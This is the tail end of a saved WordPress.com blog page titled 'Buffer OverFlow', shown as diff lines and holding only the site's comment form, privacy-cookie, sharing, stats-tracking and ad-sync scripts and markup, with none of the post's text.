+		<div class="comment-form-posting-as-cancel"><a href="javascript:HighlanderComments.cancelExternalWindow();">Batal</a></div>
+		<p>Connecting to %s</p>
+	</div>
+
+</div>
+
+<script type="text/javascript">
+var highlander_expando_javascript = function(){
+	var input = document.createElement( 'input' ),
+	    comment = jQuery( '#comment' );
+
+	if ( 'placeholder' in input ) {
+		comment.attr( 'placeholder', jQuery( '.comment-textarea label' ).remove().text() );
+	}
+
+	// Expando Mode: start small, then auto-resize on first click + text length
+	jQuery( '#comment-form-identity' ).hide();
+	jQuery( '#comment-form-subscribe' ).hide();
+	jQuery( '#commentform .form-submit' ).hide();
+
+	comment.css( { 'height':'10px' } ).one( 'focus', function() {
+		var timer = setInterval( HighlanderComments.resizeCallback, 10 )
+		jQuery( this ).animate( { 'height': HighlanderComments.initialHeight } ).delay( 100 ).queue( function(n) { clearInterval( timer ); HighlanderComments.resizeCallback(); n(); } );
+		jQuery( '#comment-form-identity' ).slideDown();
+		jQuery( '#comment-form-subscribe' ).slideDown();
+		jQuery( '#commentform .form-submit' ).slideDown();
+	});
+}
+jQuery(document).ready( highlander_expando_javascript );
+</script>
+
+<div id="comment-form-subscribe" style="display: none;">
+	<p class="comment-subscription-form"><input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;"> <label class="subscribe-label" id="subscribe-label" for="subscribe" style="display: inline;">Beri tahu saya komentar baru melalui email.</label></p><p class="post-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto;"> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog" style="display: inline;">Beritahu saya pos-pos baru lewat surat elektronik.</label></p></div>
+
+
+
+
+<p class="form-submit" style="display: none;"><input name="submit" type="submit" id="comment-submit" class="submit" value="Kirim Komentar"> <input type="hidden" name="comment_post_ID" value="56" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0276906c3b"></p>
+<input type="hidden" name="genseq" value="1592920627">
+<p style="display: none;"></p><input type="hidden" id="ak_js" name="ak_js" value="1592920656315"></form>	</div><!-- #respond -->
+	<div style="clear: both"></div></div><!-- #respondcon -->
+
+		
+		</div>
+	</div>
+
+	<div id="nav-post">
+		<div class="navigation-bott">
+			<div class="leftnav"><a href="https://sholeh012.wordpress.com/2011/10/31/securing-operatring-system/" rel="prev">SECURING OPERATRING SYSTEM</a></div>					</div>
+	</div>
+</div>
+
+			<hr>
+
+			<div id="footer" role="contentinfo">
+
+				
+			</div>
+
+		</div><!-- #container -->
+	</div><!-- #page -->
+
+	<div id="footer-bott">
+		<a href="https://wordpress.com/?ref=footer_website" rel="nofollow">Buat situs web atau blog gratis di WordPress.com.</a>	</div>
+
+	<div class="footerbar"></div>
+</div><!-- #wrapper -->
+
+<!--  -->
+<script src="Buffer%20OverFlow%20|%20sholeh012_files/gprofiles.js"></script>
+<script>
+var WPGroHo = {"my_hash":""};
+</script>
+<script type="text/javascript" src="Buffer%20OverFlow%20|%20sholeh012_files/wpgroho.js"></script>
+
+	<script>
+		//initialize and attach hovercards to all gravatars
+		jQuery( document ).ready( function( $ ) {
+
+			if (typeof Gravatar === "undefined"){
+				return;
+			}
+
+			if ( typeof Gravatar.init !== "function" ) {
+				return;
+			}			
+
+			Gravatar.profile_cb = function( hash, id ) {
+				WPGroHo.syncProfileData( hash, id );
+			};
+			Gravatar.my_hash = WPGroHo.my_hash;
+			Gravatar.init( 'body', '#wp-admin-bar-my-account' );
+		});
+	</script>
+
+		<div style="display:none">
+	</div>
+<script>
+var HighlanderComments = {"loggingInText":"Logging In\u2026","submittingText":"Memposkan Komentar\u2026","postCommentText":"Kirim Komentar","connectingToText":"Connecting to %s","commentingAsText":"%1$s: You are commenting using your %2$s account.","logoutText":"Log Keluar","loginText":"Login","connectURL":"https:\/\/sholeh012.wordpress.com\/public.api\/connect\/?action=request","logoutURL":"https:\/\/sholeh012.wordpress.com\/wp-login.php?action=logout&_wpnonce=db9d486439","homeURL":"https:\/\/sholeh012.wordpress.com\/","postID":"56","gravDefault":"identicon","enterACommentError":"Silakan masukkan komentar","enterEmailError":"Masukkan alamat email di sini","invalidEmailError":"Alamat email tidak valid","enterAuthorError":"Masukkan nama Anda di sini","gravatarFromEmail":"Gambar ini akan tampil ketika Anda memberi komentar. Klik untuk mengubahnya.","logInToExternalAccount":"Log in untuk memakai data dari salah satu akun ini.","change":"Ubah","changeAccount":"Ubah Akun","comment_registration":"0","userIsLoggedIn":"","isJetpack":"","text_direction":"ltr"};
+</script>
+<script type="text/javascript" src="Buffer%20OverFlow%20|%20sholeh012_files/a"></script>
+		<!-- CCPA [start] -->
+		<script type="text/javascript">
+			( function () {
+
+				var setupPrivacy = function() {
+
+					document.addEventListener( 'DOMContentLoaded', function() {
+
+						// Minimal Mozilla Cookie library
+						// https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie/Simple_document.cookie_framework
+						var cookieLib = window.cookieLib = {getItem:function(e){return e&&decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*"+encodeURIComponent(e).replace(/[\-\.\+\*]/g,"\\$&")+"\\s*\\=\\s*([^;]*).*$)|^.*$"),"$1"))||null},setItem:function(e,o,n,t,r,i){if(!e||/^(?:expires|max\-age|path|domain|secure)$/i.test(e))return!1;var c="";if(n)switch(n.constructor){case Number:c=n===1/0?"; expires=Fri, 31 Dec 9999 23:59:59 GMT":"; max-age="+n;break;case String:c="; expires="+n;break;case Date:c="; expires="+n.toUTCString()}return"rootDomain"!==r&&".rootDomain"!==r||(r=(".rootDomain"===r?".":"")+document.location.hostname.split(".").slice(-2).join(".")),document.cookie=encodeURIComponent(e)+"="+encodeURIComponent(o)+c+(r?"; domain="+r:"")+(t?"; path="+t:"")+(i?"; secure":""),!0}};
+
+						var setDefaultOptInCookie = function() {
+							var value = '1YNN';
+							var domain = '.wordpress.com' === location.hostname.slice( -14 ) ? '.rootDomain' : location.hostname;
+							cookieLib.setItem( 'usprivacy', value, 365 * 24 * 60 * 60, '/', domain );
+						};
+
+						var setCcpaAppliesCookie = function( value ) {
+							var domain = '.wordpress.com' === location.hostname.slice( -14 ) ? '.rootDomain' : location.hostname;
+							cookieLib.setItem( 'ccpa_applies', value, 24 * 60 * 60, '/', domain );
+						}
+
+						var maybeCallDoNotSellCallback = function() {
+							if ( 'function' === typeof window.doNotSellCallback ) {
+								return window.doNotSellCallback();
+							}
+
+							return false;
+						}
+
+						var usprivacyCookie = cookieLib.getItem( 'usprivacy' );
+
+						if ( null !== usprivacyCookie ) {
+							maybeCallDoNotSellCallback();
+							return;
+						}
+
+						var ccpaCookie = cookieLib.getItem( 'ccpa_applies' );
+
+						if ( null === ccpaCookie ) {
+
+							var request = new XMLHttpRequest();
+							request.open( 'GET', 'https://public-api.wordpress.com/geo/', true );
+
+							request.onreadystatechange = function () {
+								if ( 4 === this.readyState ) {
+									if ( 200 === this.status ) {
+
+										var data = JSON.parse( this.response );
+										var ccpa_applies = data['region'] && data['region'].toLowerCase() === 'california';
+
+										setCcpaAppliesCookie( ccpa_applies );
+
+										if ( ccpa_applies ) {
+											if ( maybeCallDoNotSellCallback() ) {
+												setDefaultOptInCookie();
+											}
+										}
+									} else {
+										setCcpaAppliesCookie( true );
+										if ( maybeCallDoNotSellCallback() ) {
+											setDefaultOptInCookie();
+										}
+									}
+								}
+							};
+
+							request.send();
+						} else {
+							if ( ccpaCookie === 'true' ) {
+								if ( maybeCallDoNotSellCallback() ) {
+									setDefaultOptInCookie();
+								}
+							}
+						}
+					} );
+				};
+
+				if ( window.defQueue && defQueue.isLOHP && defQueue.isLOHP === 2020 ) {
+					defQueue.items.push( setupPrivacy );
+				} else {
+					setupPrivacy();
+				}
+
+			} )();
+		</script>
+
+		<!-- CCPA [end] -->
+					<script type="text/javascript">
+			( function( $ ) {
+				$( document.body ).on( 'post-load', function () {
+					if ( typeof __ATA.insertInlineAds === 'function' ) {
+						__ATA.insertInlineAds();
+					}
+				} );
+			} )( jQuery );
+			</script>
+	<div id="carousel-reblog-box">
+		<form action="#" name="carousel-reblog">
+			<textarea id="carousel-reblog-content" name="carousel-reblog-content" placeholder="Tambahkan pemikiran Anda di sini... (opsional)"></textarea>
+			<label for="carousel-reblog-to-blog-id" id="carousel-reblog-lblogid">Tuliskan ke</label>
+			<select name="carousel-reblog-to-blog-id" id="carousel-reblog-to-blog-id">
+						</select>
+
+			<div class="submit">
+				<span class="canceltext"><a href="#" class="cancel">Batal</a></span>
+				<input type="submit" name="carousel-reblog-submit" class="button" id="carousel-reblog-submit" value="Reblog Pos">
+				<input type="hidden" id="carousel-reblog-blog-id" value="24419661">
+				<input type="hidden" id="carousel-reblog-blog-url" value="https://sholeh012.wordpress.com">
+				<input type="hidden" id="carousel-reblog-blog-title" value="sholeh012">
+				<input type="hidden" id="carousel-reblog-post-url" value="">
+				<input type="hidden" id="carousel-reblog-post-title" value="">
+			</div>
+
+			<input type="hidden" id="_wpnonce" name="_wpnonce" value="112d5327a5"><input type="hidden" name="_wp_http_referer" value="/2011/11/07/buffer-overflow/">		</form>
+
+		<div class="arrow"></div>
+	</div>
+
+	<script type="text/javascript">
+		window.WPCOM_sharing_counts = {"https:\/\/sholeh012.wordpress.com\/2011\/11\/07\/buffer-overflow\/":56};
+	</script>
+				<link rel="stylesheet" id="all-css-0-3" href="Buffer%20OverFlow%20|%20sholeh012_files/jetpack-carousel.css" type="text/css" media="all">
+<script>
+var actionbardata = {"siteID":"24419661","siteName":"sholeh012","siteURL":"http:\/\/sholeh012.wordpress.com","icon":"<img alt='' src='https:\/\/s0.wp.com\/i\/logo\/wpcom-gray-white.png' class='avatar avatar-50' height='50' width='50' \/>","canManageOptions":"","canCustomizeSite":"","isFollowing":"","themeSlug":"pub\/greyzed","signupURL":"https:\/\/wordpress.com\/start\/","loginURL":"https:\/\/wordpress.com\/log-in?redirect_to=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F&signup_flow=account","themeURL":"","xhrURL":"https:\/\/sholeh012.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"90e9733709","isSingular":"1","isFolded":"","isLoggedIn":"","isMobile":"","subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"dae6e75c4a\" \/>","referer":"https:\/\/sholeh012.wordpress.com\/2011\/11\/07\/buffer-overflow\/","canFollow":"1","feedID":null,"statusMessage":"","customizeLink":"https:\/\/sholeh012.wordpress.com\/wp-admin\/customize.php?url=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F","postID":"56","shortlink":"https:\/\/wp.me\/p1EsFv-U","canEditPost":"","editLink":"https:\/\/wordpress.com\/post\/sholeh012.wordpress.com\/56","statsLink":"https:\/\/wordpress.com\/stats\/post\/56\/sholeh012.wordpress.com","i18n":{"view":"Lihat Situs","follow":"Ikuti","following":"Mengikuti","edit":"Sunting","login":"Masuk","signup":"Mulai","customize":"Sesuaikan","report":"Laporkan isi ini","themeInfo":"Dapatkan tema: Greyzed","shortlink":"Salin shortlink","copied":"Tersalin","followedText":"Pos baru dari situs ini sekarang akan ditampilkan di <a href=\"https:\/\/wordpress.com\/\">Pembaca<\/a> Anda","foldBar":"Ciutkan bilah ini","unfoldBar":"Perluas bilah ini","editSubs":"Kelola langganan","viewReader":"Lihat situs dalam Pembaca","viewReadPost":"View post in Reader","subscribe":"Daftarkan saya","enterEmail":"Masukkan alamat email Anda","followers":"","alreadyUser":"Sudah punya akun WordPress.com? <a href=\"https:\/\/wordpress.com\/log-in?redirect_to=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F&signup_flow=account\">Login sekarang.<\/a>","stats":"Statistik"}};
+</script>
+<script>
+var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"id","ajaxurl":"https:\/\/sholeh012.wordpress.com\/wp-admin\/admin-ajax.php","nonce":"977768c9f1","display_exif":"1","display_comments":"1","display_geo":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Komentar","post_comment":"Kirim Komentar","write_comment":"Tulis Komentar...","loading_comments":"Memuat Komentar...","download_original":"Tampilkan ukuran penuh <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Pastikan memasukkan teks sebelum mengirimkan komentar Anda.","no_comment_email":"Silakan masukkan alamat email ke form komentar.","no_comment_author":"Silakan masukkan nama ke form komentar.","comment_post_error":"Maaf, terjadi galat saat menerbitkan komentar Anda. Silakan coba lagi.","comment_approved":"Komentar Anda telah disetujui.","comment_unapproved":"Komentar Anda sedang dimoderasi.","camera":"Kamera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Hak cipta","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/sholeh012.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F","blog_id":"24419661","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"local_comments_commenting_as":"<fieldset><label for=\"email\">Surel (Wajib)<\/label> <input type=\"text\" name=\"email\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-email-field\" \/><\/fieldset><fieldset><label for=\"author\">Nama (Wajib)<\/label> <input type=\"text\" name=\"author\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-author-field\" \/><\/fieldset><fieldset><label for=\"url\">Situs web<\/label> <input type=\"text\" name=\"url\" class=\"jp-carousel-comment-form-field jp-carousel-comment-form-text-field\" id=\"jp-carousel-comment-form-url-field\" \/><\/fieldset>","reblog":"Reblog","reblogged":"Telah Dilakukan Reblog","reblog_add_thoughts":"Tambahkan pemikiran Anda di sini... (opsional)","reblogging":"Reblogging...","post_reblog":"Post Reblog","stats_query_args":"blog=24419661&v=wpcom&tz=0&user_id=0&subd=sholeh012","is_public":"1","reblog_enabled":""};
+</script>
+<script>
+var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
+</script>
+<script type="text/javascript" src="Buffer%20OverFlow%20|%20sholeh012_files/a_002.js"></script><div class="widget widget_eu_cookie_law_widget" style="display: block;"><div class="hide-on-button ads-active" data-hide-timeout="30" data-consent-expiration="180" id="eu-cookie-law">
+	<form method="post">
+		<input type="submit" value="Tutup dan terima" class="accept">
+
+		Privasi &amp; Cookie: Situs ini menggunakan cookie. Dengan melanjutkan
+ menggunakan situs web ini, Anda setuju dengan penggunaan mereka. <br>
+Untuk mengetahui lebih lanjut, termasuk cara mengontrol cookie, lihat di sini:
+		<a href="https://automattic.com/cookies">
+			Kebijakan Cookie		</a>
+ </form>
+</div>
+</div><div id="actionbar" class="actnbr-pub-greyzed actnbr-has-follow actnbr-hidden"><ul><li class="actnbr-btn actnbr-hidden"> 			    	<a class="actnbr-action actnbr-actn-follow" href=""><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Ikuti</span></a> 			    	<div class="actnbr-popover tip tip-top-left actnbr-notice"> 			    		<div class="tip-arrow"></div> 			    		<div class="tip-inner actnbr-follow-bubble"></div> 			    	</div> 			    </li><li class="actnbr-ellipsis actnbr-hidden"> 			  <svg class="gridicon gridicon__ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><circle cx="5" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle></g></svg> 			  <div class="actnbr-popover tip tip-top-left actnbr-more"> 			  	<div class="tip-arrow"></div> 			  	<div class="tip-inner"> 				  <ul> 				    <li class="actnbr-sitename actnbr-hidden"><a href="http://sholeh012.wordpress.com/"><img alt="" src="Buffer%20OverFlow%20|%20sholeh012_files/wpcom-gray-white.png" class="avatar avatar-50" width="50" height="50"> sholeh012</a></li> 				   	<li class="actnbr-folded-customize actnbr-hidden"><a href="https://sholeh012.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F"><svg class="gridicon gridicon__customize" height="20px" width="20px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z" data-reactid=".2.1.1:0.1b.0"></path></g></svg><span>Sesuaikan<span></span></span></a></li> 				    <li class="actnbr-folded-follow actnbr-hidden"><a class="actnbr-action actnbr-actn-follow" href=""><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Ikuti</span></a></li> 					<li class="actnbr-signup actnbr-hidden"><a href="https://wordpress.com/start/">Mulai</a></li> 				    <li class="actnbr-login actnbr-hidden"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fsholeh012.wordpress.com%2F2011%2F11%2F07%2Fbuffer-overflow%2F&amp;signup_flow=account">Masuk</a></li> 				     				    <li class="actnbr-shortlink actnbr-hidden"><a href="https://wp.me/p1EsFv-U">Salin shortlink</a></li> 				    <li class="flb-report actnbr-hidden"><a href="http://en.wordpress.com/abuse/">Laporkan isi ini</a></li> 				     				     				    <li class="actnbr-subs actnbr-hidden"><a href="https://subscribe.wordpress.com/">Kelola langganan</a></li> 				    <li class="actnbr-fold actnbr-hidden"><a href="">Ciutkan bilah ini</a></li> 			      </ul> 			    </div> 		      </div> 		    </li> 	      </ul></div>
+<script type="text/javascript">
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
+				return false;
+			});
+var windowOpen;
+			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
+				// If there's another sharing window open, close it.
+				if ( 'undefined' !== typeof windowOpen ) {
+					windowOpen.close();
+				}
+				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
+				return false;
+			});
+</script>
+<script type="text/javascript">
+// <![CDATA[
+(function() {
+try{
+  if ( window.external &&'msIsSiteMode' in window.external) {
+    if (window.external.msIsSiteMode()) {
+      var jl = document.createElement('script');
+      jl.type='text/javascript';
+      jl.async=true;
+      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(jl, s);
+    }
+  }
+}catch(e){}
+})();
+// ]]>
+</script>		<iframe src="Buffer%20OverFlow%20|%20sholeh012_files/master.html" scrolling="no" id="likes-master" name="likes-master" style="display:none;"></iframe>
+		<div id="likes-other-gravatars"><div class="likes-text"><span>%d</span> blogger menyukai ini:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+<script src="Buffer%20OverFlow%20|%20sholeh012_files/w.js" type="text/javascript" async="" defer="defer"></script>
+<script type="text/javascript">
+_tkq = window._tkq || [];
+_stq = window._stq || [];
+_tkq.push(['storeContext', {'blog_id':'24419661','blog_tz':'0','user_lang':'id','blog_lang':'id','user_id':'0'}]);
+_stq.push(['view', {'blog':'24419661','v':'wpcom','tz':'0','user_id':'0','post':'56','subd':'sholeh012'}]);
+_stq.push(['extra', {'crypt':'UE5XaGUuOTlwaD85flAmcm1mcmZsaDhkV11YdTdvUG14Q2VDQTR4LlUsLi82dU1mai9BMlJJWUJnN2NVaVRYMlNZelNtUF8wTnJ+Y1V4RS1Uei93WzFiakhodV0meVhDWmt0eWUzdi0yT0p+SHw0UnBhbEhHNW9NckRTdlt3Lis9XXNmSHp8Vzh8ZVtRM2pOVDdILC9senxNWHBndVhUOGRJSFE9K3BOQWIvUFRmQzdBX3RTSFJfbWVmYm9ERUYlX2pFY1M2bGZGaVI0ciZILm4wfFE5JUlYOHU4SHAzW3I3VUhrVGhvLEdmPXVXREpHLzB2VF9PNEgwciYlOGFvc2IsTldTLzFdQlosYTNlbFpEaHllVnw3dnZpd1trOQ=='}]);
+_stq.push([ 'clickTrackerInit', '24419661', '56' ]);
+	</script>
+<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
+		<script defer="defer" src="data:text/javascript,%21function%28%29%7B%22use%20strict%22%3Bvar%20e%3D%5B%5D%2Ct%3D%22wpcom.simple.ttfb.batcache.%22%3Btry%7Bfor%28var%20n%3Dperformance.getEntriesByType%28%22navigation%22%29%5B0%5D%7C%7C%7B%7D%2Co%3D0%2Cs%3Ddocument.body.childNodes%2Cc%3Ds.length-1%3Bc%3E%3D0%3Bc--%29s%5Bc%5D.nodeType%3D%3D%3DNode.COMMENT_NODE%26%26s%5Bc%5D.textContent.indexOf%28%22served%20from%20batcache%22%29%3E0%26%26%28o%3D1%29%3Bvar%20r%3DMath.round%28n.responseStart%7C%7C0%29%3Bif%28r%3E0%26%26%28o%3Fe.push%28t%2B%22hit%3A%22%2Br%2B%22%7Cms%22%29%3Ae.push%28t%2B%22miss%3A%22%2Br%2B%22%7Cms%22%29%29%2Ce.length%29document.createElement%28%22img%22%29.src%3D%22https%3A%2F%2Fpixel.wp.com%2Fboom.gif%3Fjson%3D%22%2BencodeURIComponent%28JSON.stringify%28%7Bbeacons%3Ae%7D%29%29%7Dcatch%28e%29%7B%7D%7D%28%29%3B"></script>
+		<script>
+if ( 'object' === typeof wpcom_mobile_user_agent_info ) {
+
+	wpcom_mobile_user_agent_info.init();
+	var mobileStatsQueryString = "";
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
+		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
+	
+	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
+		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
+	
+	if( wpcom_mobile_user_agent_info.isIPad() )
+		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';
+
+	if( "" != mobileStatsQueryString ) {
+		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
+	}
+	
+}
+</script>
+<img src="Buffer%20OverFlow%20|%20sholeh012_files/g.gif" alt=":)" id="wpstats"><iframe style="display: none" src="Buffer%20OverFlow%20|%20sholeh012_files/user_sync.html"></iframe><iframe style="display: none" src="https://ssc-cms.33across.com/ps/?m=xch&amp;rt=html&amp;id=0010b00002CphGRAAZ&amp;gdpr_consent=&amp;ru=https%3A%2F%2Fs.pubmine.com%2Fmatch%3Fbidder_id%3D6%26external_user_id%3D33XUSERID33X%26ssp_data%3D506b329c-6ac9-4c32-9a03-76284b182fc5%26rid%3D4310941414915%26gdpr%3D0%26gdpr_consent%3D%26us_privacy%3D"></iframe><style>.ata-controls__complain-btn:hover,
+.ata-controls__privacy-btn:hover {
+    color: #666666 !important;
+}
+.ata-controls__complain-btn:active,
+.ata-controls__privacy-btn:active {
+    color: #5ac8fa !important;
+}
+.ata-controls__complain-btn_clicked,
+.ata-controls__complain-btn_clicked:hover,
+.ata-controls__complain-btn_clicked:active {
+    color: #000 !important;
+    cursor: default !important;
+}
+.ata-frame-wrapper {
+    overflow: hidden;
+    position: relative;
+}
+</style></body></html>
